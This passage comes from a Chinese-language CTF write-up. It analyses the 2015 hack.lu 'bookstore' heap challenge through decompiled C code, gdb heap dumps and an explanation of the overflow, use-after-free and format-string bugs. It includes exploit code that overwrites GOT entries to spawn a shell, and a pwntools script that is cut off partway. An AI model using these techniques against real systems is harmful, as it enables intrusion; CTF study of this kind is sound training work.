class="line">    <span class="comment">#gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">    <span class="comment"># trigger system("/bin/sh")</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="1-2-2015-hacklu-bookstore"><a href="#1-2-2015-hacklu-bookstore" class="headerlink" title="1.2. 2015 hacklu bookstore"></a>1.2. 2015 hacklu bookstore</h2><h3 id="1-2-1-功能分析"><a href="#1-2-1-功能分析" class="headerlink" title="1.2.1. 功能分析"></a>1.2.1. 功能分析</h3><p>先进行功能分析</p>
<ol>
<li>有编辑功能，编辑已存在的1,2堆块，可溢出</li>
<li>删除功能，删除已存在的1,2堆块，uaf</li>
<li>合并功能，将1,2两个堆块合并,格式化字符串</li>
</ol>
<h3 id="1-2-2-漏洞点分析"><a href="#1-2-2-漏洞点分析" class="headerlink" title="1.2.2. 漏洞点分析"></a>1.2.2. 漏洞点分析</h3><ol>
<li>漏洞点1(任意写，\n才结束)</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit_order</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> cnt; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != <span class="string">'\n'</span> )<span class="comment">//关键点</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    idx = cnt++;</span><br><span class="line">    a1[idx] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[cnt - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>漏洞点2(uaf)</li>
</ol>
<p>free后指针没置空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">delete_order</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1); <span class="comment">//重点</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>格式化字符串</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> *first_order; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> *second_order; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  first_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  second_order = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !first_order || !second_order || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">" _____          _   _                 _          _                   _ \n"</span></span><br><span class="line">    <span class="string">"/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n"</span></span><br><span class="line">    <span class="string">"  / /\\/ _ \\ \\/ / __| '_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| '__/ _ \\/  /\n"</span></span><br><span class="line">    <span class="string">" / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n"</span></span><br><span class="line">    <span class="string">" \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n"</span></span><br><span class="line">    <span class="string">"Crappiest and most expensive books for your college education!\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"We can order books for you in case they're not in stock.\n"</span></span><br><span class="line">    <span class="string">"Max. two orders allowed!\n"</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1: Edit order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2: Edit order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3: Delete order 1"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4: Delete order 2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5: Submit"</span>);</span><br><span class="line">    fgets(&amp;s, <span class="number">0x80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter first order:"</span>);</span><br><span class="line">        edit_order(first_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Enter second order:"</span>);</span><br><span class="line">        edit_order(second_order);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        delete_order(first_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        delete_order(second_order);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        submit(v5, first_order, second_order);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);<span class="comment">//格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="1-2-3-漏洞利用过程"><a href="#1-2-3-漏洞利用过程" class="headerlink" title="1.2.3. 漏洞利用过程"></a>1.2.3. 漏洞利用过程</h3><p>这题有三个明显的洞，比原来那些只有一个洞的看起来似乎简单些？实际相反，这道题利用起来难度比前面的还大，因为这个洞不好利用，我自己研究了好久也无果，然后找writeup<br>看了看雪大佬的文章才知道这题怎么利用的</p>
<p>开始我在想如何利用格式化字符串的洞，因为格式化字符串的洞在合并过后才会使用，而我没想到什么便捷方法能修改第三块堆块的内容，他只能被覆盖为默认的<strong>Your order is submitted!\n</strong>，后来才知道用overlaping后可以覆盖到第三块堆块的内容，不过还是得精心布置堆才可以利用到</p>
<ol>
<li>开头程序malloc(0x80)申请了三个堆块，我们将第二块free掉</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x1b8d010-0x010</span><br><span class="line">0x1b8d000:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块1</span></span><br><span class="line">0x1b8d010:	0x0000000074736574	0x0000000000000000</span><br><span class="line">0x1b8d020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d090:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块2，溢出修改处</span></span><br><span class="line">0x1b8d0a0:	0x0000000000000000	0x0000000000000000 <span class="comment">#数据部分</span></span><br><span class="line">0x1b8d0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d120:	0x0000000000000000	0x0000000000000091 <span class="comment">#堆块3</span></span><br><span class="line">0x1b8d130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1b8d140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1b8d150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d1b0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x1b8d1c0:	0x696d627553203a35	0x20726564726f0a74</span><br><span class="line">0x1b8d1d0:	0x216465776f0a0a32	0x6163206e6920750a</span><br><span class="line">0x1b8d1e0:	0x2779656874206573	0x6920746f6e206572</span><br><span class="line">0x1b8d1f0:	0x2e6b636f7473206e	0x5f0a216e6f69740a</span><br><span class="line">0x1b8d200:	0x0a2020202f5c5f5f	0x0000000000000000</span><br><span class="line">0x1b8d210:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d220:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d230:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d2f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1b8d310:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>编辑第一块堆块内容，溢出到第二块的size，修改第二块的size为0x150，为什么是0x150?(因为你看程序在合并的时候有个malloc(0x140)，这样合并的时候申请的堆块就会跑到这上面来，也就是说我们第二块堆块跟第三块堆块这时候会重合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1695028-0x28</span><br><span class="line">0x1695000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x1695010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x1695020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x1695030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1695080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x1695090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x16950a0:	0x00007f0e99412b00	0x00007f0e99412b78</span><br><span class="line">0x16950b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x16950f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695120:	0x0000000000000090	0x0000000000000090</span><br><span class="line">0x1695130:	0x64726f2072756f59	0x7573207369207265</span><br><span class="line">0x1695140:	0x2164657474696d62	0x000000000000000a</span><br><span class="line">0x1695150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1695180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后submit的时候具体会变成什么样呢?，会先复制<strong>Order 1: **，然后在复制chunk1里的内容，在复制chunk2里的内容，注意注意chunk2的内容现在是什么，是前面的</strong>Order 1: **在加上chunk1的内容，因为堆块2的指针还指向chunk2的数据部分，所以会复制两次</p>
</li>
<li><p>就是<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: **+chun1+’\n’</p>
</li>
<li><p>如果我们要利用格式化字符串的洞的话，要精确复制到堆块3的size部分后就停止，到这部分大小是0x90</p>
</li>
<li><p>也就是说我们<strong>Order 1: **+chunk1+’\n’+</strong>Order 2: <strong>+</strong>Order 1: *<em>这个的大小要为0x90，求出chunk大小，0x90-9</em>3-1=0x88-0x1c=0x74</p>
</li>
<li><p>所以我们可以在前面0x74里写格式化字符串的利用，后面就利用得上了</p>
</li>
</ol>
<p>这是合并后的结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/56gx 0x6e6028-0x28</span><br><span class="line">0x6e6000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x6e6010:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6020:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6080:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x6e6090:	0x0000000000000000	0x0000000000000151</span><br><span class="line">0x6e60a0:	0x3a3120726564724f	0x2563373136322520</span><br><span class="line">0x6e60b0:	0x3325516e68243331	0x2438322550702431</span><br><span class="line">0x6e60c0:	0x6161616161616170	0x6161616161616161</span><br><span class="line">0x6e60d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e60f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6100:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6110:	0x6161616161616161	0x724f0a6161616161</span><br><span class="line">0x6e6120:	0x4f203a3220726564	0x203a312072656472</span><br><span class="line">0x6e6130:	0x3125633731363225	0x313325516e682433</span><br><span class="line">0x6e6140:	0x7024383225507024	0x6161616161616161</span><br><span class="line">0x6e6150:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6160:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6170:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6180:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e6190:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6e61a0:	0x64724f0a61616161	0x000a203a32207265</span><br><span class="line">0x6e61b0:	0x0000000000000000	0x0000000000000411</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>既然是堆题我就不再讲格式化字符串利用了，后面先利用格式化字符串修改.fini的地址，这样能多返回一次到main函数，同时泄露libc函数地址，为什么修改.fini里的地址能多返回一次main函数呢，请看</li>
</ol>
<p><a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">linux_x86程序启动中文版</a><br><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">linux_x86程序启动英文版</a><br>这两篇文章一样的，不过一个中文版，一个英文版，建议英文好的同学读原版，因为.fini在exit前会进行调用，所以修改后能执行多一次main函数</p>
<ol start="9">
<li>这时候发觉泄露出libc后不知道修改哪个函数了，因为调用printf后再也没函数用了，这时候思路又断了</li>
<li>所以这时候想想别的办法，发觉栈上存了一个与存main函数返回地址的指针存在一定偏移的地址，所以泄露出来后，在减掉那个固定偏移就可以修改main函数返回地址了</li>
</ol>
<p>注意：这里格式化字符串内容存在堆里，指针存在栈上，所以我们fgets输入的才是对应上的偏移</p>
<h3 id="1-2-4-exp"><a href="#1-2-4-exp" class="headerlink" title="1.2.4. exp"></a>1.2.4. exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'books'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'books'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span> :</span></span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvregex(<span class="string">r'''Enter (.*?) order:\n'''</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span> :</span></span><br><span class="line">    